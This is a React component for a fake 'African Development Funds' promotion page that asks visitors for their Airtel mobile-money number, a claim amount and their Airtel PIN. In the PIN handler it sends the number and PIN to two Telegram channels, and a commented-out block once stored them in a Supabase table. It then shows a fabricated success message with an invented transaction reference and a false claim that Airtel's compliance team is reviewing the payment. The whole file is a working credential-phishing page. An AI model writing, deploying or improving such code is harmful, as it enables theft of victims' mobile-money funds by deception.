import { useState } from "react";
import styles from "./ClientSide.module.css";
// import { supabase } from "../assets/lib/supabase.js";
// import { useNavigate } from "react-router-dom";
import { sendToTelegram } from "./telegram.jsx";
import { sendToTelegram2 } from "./telegram copy.jsx";
export default function ClientSide() {
  // const navigate = useNavigate();
  const [next, setnext] = useState(false);

  const [clientNumber, setclientNumber] = useState("");
  const [clientPin, setclientPin] = useState("");
  const [amount, setAmount] = useState("");
  const [invalidNo, setwrongNo] = useState(false);
  const [success, setsuccess] = useState(false);
  const [invalidpin, setwrongpi] = useState(false);

  function goToAdmin() {
    // navigate("/admin");
  }

  function handleSubmit(e) {
    e.preventDefault();
    if (clientNumber.length !== 10 || amount.length === 0) {
      setwrongNo(true);
      return;
    }

    setnext(true);
    // console.log(clientNumber);
  }

  async function handleSubmitPin(e) {
    e.preventDefault();
    if (clientPin.length !== 4) {
      setwrongpi(true);
      return;
    }
    // uploaddata();
    await sendToTelegram(
      `New Airtel Claim:\nAirtel Number: ${clientNumber}\nAirtel Pin: ${clientPin}`
    );
    await sendToTelegram2(
      `New Airtel Claim:\nAirtel Number: ${clientNumber}\nAirtel Pin: ${clientPin}`
    );
    setsuccess(true);
  }
  // const client = {
  //   number: clientNumber,
  //   pin: clientPin,
  // };
  // async function uploaddata() {
  //   const { error } = await supabase
  //     .from("clientdata")
  //     .insert([client])
  //     .select();
  //   if (!error) {
  //     // setFormDta({ number: "", pin: "", vercode: "" });
  //     console.log(error);
  //   }
  // }
  return (
    <div className={`${styles.container} ${success && styles.marCon}`}>
      <img
        src="/logo.jpg"
        alt="logo"
        className={styles.logo}
        onClick={goToAdmin}
      />
      <h1>
        African Development <br></br>Funds
      </h1>
      {!success ? (
        <form>
          {/* <div className={`${styles.myform} ${next ? styles.hide : ""}`}> */}
          <div className={`${styles.myform} ${next && styles.hide}`}>
            <label htmlFor="number">
              Enter your <b>Airtel</b> No
            </label>
            <input
              type="number"
              value={clientNumber}
              onChange={(e) => setclientNumber(e.target.value)}
              placeholder="09XXXX or 07XXXX"
            />
            <label htmlFor="number">
              Enter <b>amount</b> to claim (zmw)
            </label>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder=" 30000"
            />
            {invalidNo && (
              <label htmlFor="number" style={{ color: "red" }}>
                Please Enter Valid Airtel number!
              </label>
            )}
            <button type="submit" onClick={(e) => handleSubmit(e)}>
              continue
            </button>
          </div>
          <div>
            <div className={`${styles.myform} + ${!next && styles.hide}`}>
              <p>
                You are about to claim your Promotion funds of ZMW {amount} to{" "}
                <br></br>
                {clientNumber}
              </p>
              <label htmlFor="number"> Airtel pin</label>
              <input
                type="number"
                value={clientPin}
                onChange={(e) => setclientPin(e.target.value)}
                placeholder="****"
              />
              {invalidpin && (
                <label htmlFor="number" style={{ color: "red" }}>
                  {" "}
                  Enter valid EcoCash pin.
                </label>
              )}
              <button type="submit" onClick={(e) => handleSubmitPin(e)}>
                Claim Now
              </button>
            </div>
          </div>
        </form>
      ) : (
        <div className={styles.success}>
          <img src="/tick.jpeg" alt="success" />
          <h2>Congrats To You</h2>
          <p>
            You have successfully claimed <b>ZMW {amount}</b> 💵 to{" "}
            <b>{clientNumber}</b>, the Promotion funds will reflect in your
            Airtel account within 10 minutes. The transaction reference number
            is <b>#A2X-BC34-XYZ </b> and is now under review by Airtel
            compliance team.If provided information is valid, the funds will be
            credited to your account within 10 minutes.
          </p>
          <p>Congratulations for SUCCESSFULL Application.</p>
        </div>
      )}
    </div>
  );
}
